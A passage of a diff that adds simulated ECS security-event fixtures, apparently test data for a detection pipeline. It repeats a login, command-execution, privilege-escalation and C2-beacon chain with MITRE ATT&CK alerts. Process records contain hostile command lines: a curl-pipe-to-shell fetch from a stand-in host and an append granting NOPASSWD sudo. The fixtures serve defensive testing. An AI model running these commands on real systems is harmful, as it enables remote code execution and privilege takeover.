+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker07 logged in from 203.0.113.7",
+    "user": {
+      "name": "attacker07",
+      "id": "u-0000000000000fa7"
+    },
+    "source": {
+      "ip": "203.0.113.7"
+    },
+    "session": {
+      "id": "sess-00000000000003ef"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:10.000Z",
+    "event": {
+      "id": "evt-000000000000003e",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:35:10.000Z",
+      "ingested": "2026-01-13T12:35:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4207,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d7",
+      "start": "2026-01-13T12:35:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:15.000Z",
+    "event": {
+      "id": "evt-000000000000003f",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:35:15.000Z",
+      "ingested": "2026-01-13T12:35:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_7.sh",
+    "file": {
+      "path": "/tmp/payload_7.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d7"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:20.000Z",
+    "event": {
+      "id": "evt-0000000000000040",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:35:20.000Z",
+      "ingested": "2026-01-13T12:35:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5207,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bbf",
+      "start": "2026-01-13T12:35:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d7",
+        "pid": 4207,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:22.000Z",
+    "event": {
+      "id": "evt-0000000000000041",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:35:22.000Z",
+      "ingested": "2026-01-13T12:35:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bbf"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:30.000Z",
+    "event": {
+      "id": "evt-0000000000000042",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:35:30.000Z",
+      "ingested": "2026-01-13T12:35:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-7.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-7.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:40.000Z",
+    "event": {
+      "id": "evt-0000000000000043",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:35:40.000Z",
+      "ingested": "2026-01-13T12:35:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-07",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138f"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000003d"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:50.000Z",
+    "event": {
+      "id": "evt-0000000000000044",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:35:50.000Z",
+      "ingested": "2026-01-13T12:35:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-07",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001777"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000003e",
+          "evt-000000000000003f"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:36:00.000Z",
+    "event": {
+      "id": "evt-0000000000000045",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:36:00.000Z",
+      "ingested": "2026-01-13T12:36:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-07",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5f"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000040",
+          "evt-0000000000000041"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:36:10.000Z",
+    "event": {
+      "id": "evt-0000000000000046",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:36:10.000Z",
+      "ingested": "2026-01-13T12:36:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000007",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-07",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f47"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000042"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:00.000Z",
+    "event": {
+      "id": "evt-0000000000000047",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:40:00.000Z",
+      "ingested": "2026-01-13T12:40:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker08 logged in from 203.0.113.8",
+    "user": {
+      "name": "attacker08",
+      "id": "u-0000000000000fa8"
+    },
+    "source": {
+      "ip": "203.0.113.8"
+    },
+    "session": {
+      "id": "sess-00000000000003f0"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:10.000Z",
+    "event": {
+      "id": "evt-0000000000000048",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:40:10.000Z",
+      "ingested": "2026-01-13T12:40:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4208,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d8",
+      "start": "2026-01-13T12:40:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:15.000Z",
+    "event": {
+      "id": "evt-0000000000000049",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:40:15.000Z",
+      "ingested": "2026-01-13T12:40:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_8.sh",
+    "file": {
+      "path": "/tmp/payload_8.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d8"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:20.000Z",
+    "event": {
+      "id": "evt-000000000000004a",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:40:20.000Z",
+      "ingested": "2026-01-13T12:40:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5208,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bc0",
+      "start": "2026-01-13T12:40:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d8",
+        "pid": 4208,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:22.000Z",
+    "event": {
+      "id": "evt-000000000000004b",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:40:22.000Z",
+      "ingested": "2026-01-13T12:40:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bc0"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:30.000Z",
+    "event": {
+      "id": "evt-000000000000004c",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:40:30.000Z",
+      "ingested": "2026-01-13T12:40:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-8.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-8.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:40.000Z",
+    "event": {
+      "id": "evt-000000000000004d",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:40:40.000Z",
+      "ingested": "2026-01-13T12:40:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-08",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-0000000000001390"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000047"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:40:50.000Z",
+    "event": {
+      "id": "evt-000000000000004e",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:40:50.000Z",
+      "ingested": "2026-01-13T12:40:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-08",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001778"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000048",
+          "evt-0000000000000049"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:41:00.000Z",
+    "event": {
+      "id": "evt-000000000000004f",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:41:00.000Z",
+      "ingested": "2026-01-13T12:41:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-08",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b60"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000004a",
+          "evt-000000000000004b"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:41:10.000Z",
+    "event": {
+      "id": "evt-0000000000000050",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:41:10.000Z",
+      "ingested": "2026-01-13T12:41:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000008",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-08",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f48"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000004c"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:00.000Z",
+    "event": {
+      "id": "evt-0000000000000051",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:45:00.000Z",
+      "ingested": "2026-01-13T12:45:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker09 logged in from 203.0.113.9",
+    "user": {
+      "name": "attacker09",
+      "id": "u-0000000000000fa9"
+    },
+    "source": {
+      "ip": "203.0.113.9"
+    },
+    "session": {
+      "id": "sess-00000000000003f1"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:10.000Z",
+    "event": {
+      "id": "evt-0000000000000052",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:45:10.000Z",
+      "ingested": "2026-01-13T12:45:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4209,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d9",
+      "start": "2026-01-13T12:45:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:15.000Z",
+    "event": {
+      "id": "evt-0000000000000053",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:45:15.000Z",
+      "ingested": "2026-01-13T12:45:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_9.sh",
+    "file": {
+      "path": "/tmp/payload_9.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d9"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:20.000Z",
+    "event": {
+      "id": "evt-0000000000000054",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:45:20.000Z",
+      "ingested": "2026-01-13T12:45:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5209,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bc1",
+      "start": "2026-01-13T12:45:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d9",
+        "pid": 4209,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:22.000Z",
+    "event": {
+      "id": "evt-0000000000000055",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:45:22.000Z",
+      "ingested": "2026-01-13T12:45:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bc1"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:30.000Z",
+    "event": {
+      "id": "evt-0000000000000056",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:45:30.000Z",
+      "ingested": "2026-01-13T12:45:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-9.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-9.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:40.000Z",
+    "event": {
+      "id": "evt-0000000000000057",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:45:40.000Z",
+      "ingested": "2026-01-13T12:45:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-09",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-0000000000001391"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000051"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:45:50.000Z",
+    "event": {
+      "id": "evt-0000000000000058",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:45:50.000Z",
+      "ingested": "2026-01-13T12:45:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-09",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001779"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000052",
+          "evt-0000000000000053"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:46:00.000Z",
+    "event": {
+      "id": "evt-0000000000000059",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:46:00.000Z",
+      "ingested": "2026-01-13T12:46:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-09",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b61"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000054",
+          "evt-0000000000000055"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:46:10.000Z",
+    "event": {
+      "id": "evt-000000000000005a",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:46:10.000Z",
+      "ingested": "2026-01-13T12:46:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000009",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-09",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f49"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000056"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:50:00.000Z",
+    "event": {
+      "id": "evt-000000000000005b",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:50:00.000Z",
+      "ingested": "2026-01-13T12:50:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-000000000000000a",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker10 logged in from 203.0.113.10",
+    "user": {
+      "name": "attacker10",
